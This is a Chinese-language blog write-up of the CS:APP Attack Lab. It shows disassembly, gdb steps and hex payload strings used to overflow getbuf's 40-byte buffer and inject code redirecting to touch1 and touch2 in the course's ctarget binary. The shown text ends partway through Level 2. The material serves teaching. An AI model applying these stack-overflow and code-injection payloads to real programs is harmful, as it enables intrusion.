<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CsApp —— Attack Lab | 温温卡的blog</title><meta name="author" content="wenwenka,wu290063155@gmail.com"><meta name="copyright" content="wenwenka"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简介这是CSAPP的第三个实验，需要对x86-64汇编语言以及调试的方式有着足够的理解。实验分为两个部分，注入攻击和返回值攻击，前者的栈的地址是固定的，后者每次栈内存的起始地址都会发生变化。 一些需要用到的操作打开Attack Lab 的文件夹，我们可以发现里面主要有4个文件：ctarget 用来进行代码注入攻击rtarget 用来进行返回值攻击cookie.txt 可以理解为ID，主要是CMU用">
<meta property="og:type" content="article">
<meta property="og:title" content="CsApp —— Attack Lab">
<meta property="og:url" content="http://example.com/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/index.html">
<meta property="og:site_name" content="温温卡的blog">
<meta property="og:description" content="简介这是CSAPP的第三个实验，需要对x86-64汇编语言以及调试的方式有着足够的理解。实验分为两个部分，注入攻击和返回值攻击，前者的栈的地址是固定的，后者每次栈内存的起始地址都会发生变化。 一些需要用到的操作打开Attack Lab 的文件夹，我们可以发现里面主要有4个文件：ctarget 用来进行代码注入攻击rtarget 用来进行返回值攻击cookie.txt 可以理解为ID，主要是CMU用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/cover.jpg">
<meta property="article:published_time" content="2023-01-18T14:07:00.000Z">
<meta property="article:modified_time" content="2023-01-18T15:00:11.563Z">
<meta property="article:author" content="wenwenka">
<meta property="article:tag" content="CsApp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/cover.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CsApp —— Attack Lab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-18 23:00:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/cover.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">温温卡的blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CsApp —— Attack Lab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-18T14:07:00.000Z" title="发表于 2023-01-18 22:07:00">2023-01-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-18T15:00:11.563Z" title="更新于 2023-01-18 23:00:11">2023-01-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CsApp —— Attack Lab"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这是CSAPP的第三个实验，需要对x86-64汇编语言以及调试的方式有着足够的理解。<br>实验分为两个部分，注入攻击和返回值攻击，前者的栈的地址是固定的，后者每次栈内存的起始地址都会发生变化。</p>
<h2 id="一些需要用到的操作"><a href="#一些需要用到的操作" class="headerlink" title="一些需要用到的操作"></a>一些需要用到的操作</h2><p>打开Attack Lab 的文件夹，我们可以发现里面主要有4个文件：<br>ctarget 用来进行代码注入攻击<br>rtarget 用来进行返回值攻击<br>cookie.txt 可以理解为ID，主要是CMU用来防止学生作弊的<br>hex2raw 用来将64进制Byte码变成字符串，可用来传入到需要攻击的程序中</p>
<p>此外，参考其他博主的宝贵经验，以下一些命令会非常有用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; ans.txt | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p>通过管道来将ans里的Byte码变成字符串传入需要攻击的程序中，-q是不发信息给服务器，自学用需要加上这个参数。<br>下面这段代码，是可以用来将x86-64汇编语言转换成对应的16位字节码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c example.s  </span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>
<p>比如，example.s</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Example of hand-generated assembly code  </span><br><span class="line">pushq   <span class="variable">$0xabcdef</span>  </span><br><span class="line">addq    <span class="variable">$17</span>,%rax  </span><br><span class="line">movl    %eax,%edx  </span><br><span class="line">; Push value onto stack  </span><br><span class="line">; Add 17 to %rax  </span><br><span class="line">; Copy lower 32 bits to %edx</span><br></pre></td></tr></table></figure>
<p>对应的example.d则是:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:  </span><br><span class="line">0000000000000000 &lt;.text&gt;:  </span><br><span class="line">   0: 68 ef <span class="built_in">cd</span> ab 00,      pushq  <span class="variable">$0xabcdef</span>  </span><br><span class="line">   5: 48 83 c0 11          add    <span class="variable">$0x11</span>,%rax  </span><br><span class="line">   9: 89 c2 mov            %eax,%edx</span><br></pre></td></tr></table></figure>

<h1 id="Part1-Code-Injection-Attacks"><a href="#Part1-Code-Injection-Attacks" class="headerlink" title="Part1 Code Injection Attacks"></a>Part1 Code Injection Attacks</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>这是lab的第一部分，代码注入攻击，ctarget是我们要攻击的程序，题目告诉我们ctarget有一个叫test的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> val;  </span><br><span class="line">    val = getbuf();  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数每次都会调用，然后这个函数会调用一个不安全的getbuf函数，与gets有点类似，不检查读入的字符串的大小，也不加以任何保护，使得我们利用getbuf，可以对其进行代码注入。<br>getbuf如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];  </span><br><span class="line">    Gets(buf);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面这张图较好反映了攻击时的过程：<br><img src="20230109164701.png"></p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>来到第一题，该题的意图是我们应当利用getbuf中的缓冲区溢出漏洞，使得执行getbuf之后重定向至touch1杰克。因此我们需要确定BUFFER_SIZE的大小以及touch1函数所在的地址。<br>touch1()的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span>  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);  </span><br><span class="line">    validate(<span class="number">1</span>);  </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>首先反编译ctarget</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.s</span><br></pre></td></tr></table></figure>
<p>将ctarget反汇编成ctarget.s<br>在ctarget上搜索getbuf函数和touch1函数：<br>可以发现getbuf的汇编代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
<p>从这里我们可以看到，getbuf函数首先执行了将rsp寄存器减去0x28这个操作，即将栈指针向下移动了40个字节，由于getbuf没有多余的参数，因此我们可以推断出BUFFER_SIZE的大小是40。<br>同样的，可以发现touch1的汇编代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   <span class="variable">$0x1</span>,0x202d0e(%rip)        <span class="comment"># 6044dc &lt;vlevel&gt;</span></span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    <span class="variable">$0x4030c5</span>,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    <span class="variable">$0x1</span>,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    <span class="variable">$0x0</span>,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	call   400e40 &lt;<span class="built_in">exit</span>@plt&gt;</span><br></pre></td></tr></table></figure>
<p>touch1不用关心它里面的细节，只要锁定第一行，即让getbuf的返回地址，指向touch1函数的地址即可。touch1函数的地址即其第一行的地址0x4017c0。</p>
<p>因此我们只需让输入溢出buffer，并且让原来的return address替换成0x4017c0即可。<br>这里输入数据，不再是控制台输入，而是需要通过一个文件，通过管道输入。</p>
<p>首先，让我们创建一个touch1.txt文件，用于输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> touch1.txt</span><br></pre></td></tr></table></figure>
<p>并通过vim touch1.txt，对文件进行修改。<br>假设我们先输入正常的字符（就是因为这个假设，折磨了我1个多小时，一直出现segment fault）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:FAIL:0xffffffff:ctarget:0:</span><br></pre></td></tr></table></figure>
<p>新建了一个test.txt用来存储字节码<br>我试了各种命令，都以失败告终：<br>cat test.txt | ./hex2raw | ./ctarget -q</p>
<p>./hex2raw &lt; test.txt &gt; raw.txt<br>./ctarget -q raw.txt</p>
<p>直到使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; test.txt &gt; raw.bin</span><br><span class="line">./ctarget -qi raw.bin</span><br></pre></td></tr></table></figure>
<p>这个如果test.txt的字节码没有溢出，同样会报segmentation fault的错误，但是他的result显示的是输入的字符，其他命令输入的result均是0。<br>这个-i，说明后面接的是一个文件输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:FAIL:0xffffffff:ctarget:0:01 02</span><br></pre></td></tr></table></figure>
<p>如果我们正好将return address替换，他将会报正确的答案，希望有大神能够解答。<br>这里有一个注意点，就是字节序的问题，因为机器是小端机器，所以字节序应该按照小端机器的规则排列。<br><img src="20230109201034.png"></p>
<p><img src="20230109201019.png"></p>
<p>第一关其实比较简单，但没想到过程竟如此曲折 qwq</p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>本题的要求是执行touch2，并传入cookie的值作为参数val<br>在attacklab.pdf的附录B，给出了如何产生字节码的步骤<br>假如我们现在有了xx.s的汇编语句<br>可以通过以下命令，得到汇编语句的反汇编格式，并得到相应的字节码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c example.s</span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>

<p>本题给出了touch2的函数实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span>&#123;  </span><br><span class="line">    vlevel = <span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);  </span><br><span class="line">        validate(<span class="number">2</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);  </span><br><span class="line">        fail(<span class="number">2</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>touch2的汇编代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   <span class="variable">$0x2</span>,0x202ce0(%rip)        <span class="comment"># 6044dc &lt;vlevel&gt;</span></span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        <span class="comment"># 6044e4 &lt;cookie&gt;</span></span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    <span class="variable">$0x4030e8</span>,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    <span class="variable">$0x1</span>,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    <span class="variable">$0x2</span>,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    <span class="variable">$0x403110</span>,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    <span class="variable">$0x1</span>,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    <span class="variable">$0x2</span>,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    <span class="variable">$0x0</span>,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	call   400e40 &lt;<span class="built_in">exit</span>@plt&gt;</span><br></pre></td></tr></table></figure>
<p>touch2的逻辑是比较我们传入touch2的参数val是否等于cookie的值。如果等于就通过。所以本体的关键是在改变返回地址前也设置rdi寄存器的值。<br>这题也是比较折磨。以为理解了，然而在理清思路的路上又花了俩小时。</p>
<p>比较清晰的思路就是，先将寄存器rdi更改，然后再让其执行touch2。但是如何执行才能让其顺利通过呢？<br>因为网上做题选手，大家的cookie都是一样的，都是0x59b997fa，所以以下汇编代码是很容易得到的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov <span class="variable">$0x59b997fa</span> %rdi</span><br></pre></td></tr></table></figure>
<p>然后就是如何巧妙地将其注入栈中，并返回touch2。<br>首先是个错误的尝试：</p>
<p>通过设定rdi的值，并返回。因此我们可以通过栈溢出，修改返回地址的方式，让getbuf在返回后，执行这两行代码，然后再返回，跳转到touch2上。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>通过以下的命令，可以将以上的汇编代码转换成字节码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;mov \$0x59b997fa, %rdi\n ret&quot; &gt; test.s</span><br><span class="line">gcc -c test.s</span><br><span class="line">objdump -d test.o &gt; test.d</span><br></pre></td></tr></table></figure>

<p>得到以下结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    <span class="variable">$0x59b997fa</span>,%rdi</span><br><span class="line">   7:   c3                      ret</span><br></pre></td></tr></table></figure>
<p>如果把以上代码放在缓冲区开始时，即getbuf的栈顶顶部，那么我们就需要找到getbuf的栈顶地址。<br>通过以下命令即可找到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b getbuf</span><br><span class="line">run -qi raw.bin <span class="comment"># 只是为了输入，否则将会执行到奇怪的地方</span></span><br><span class="line">stepi <span class="comment"># 进入断点下一行，即4017ac</span></span><br><span class="line">p/x rsp</span><br><span class="line"><span class="comment"># &gt; $1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
<p>因此，栈顶的地址即为0x5561dc78<br>整合上面的信息，我们可以得到如下字节码的组合：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 /* mov 放在栈顶 */</span><br><span class="line">c3 /* ret 返回到touch2那一行 */</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 对齐40个 */</span><br><span class="line">78 dc 61 55 00 00 00 00 /* 更改的返回地址 */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* touch2 的地址 */</span><br></pre></td></tr></table></figure>
<p>是不是觉得上面的答案看起来很合理，然而又出现了段错误：<br><img src="20230109224901.png"></p>
<p>参考其他博主的回答：ret两次就会存在问题，这点我还没有厘清。我认为估计是栈溢出的范围太大了，影响到了其他的地址。所以不能将touch2的地址放在最上面。<br>那我们就再换个思路，在mov后，可以将touch2的地址压入栈中，ret后，则会取到压入栈中的touch2地址。<br>而push 0x4017ec的字节码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68 ec 17 40 00</span><br></pre></td></tr></table></figure>
<p>因此，我们可以对字节码的组合再次改写:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 /* mov 放在栈顶 */</span><br><span class="line">68 ec 17 40 00 /* push 0x4017ec */</span><br><span class="line">c3 /* ret */</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 /* 补齐至40个 */</span><br><span class="line">78 dc 61 55 00 00 00 00 /* 更改的返回地址 */</span><br></pre></td></tr></table></figure>
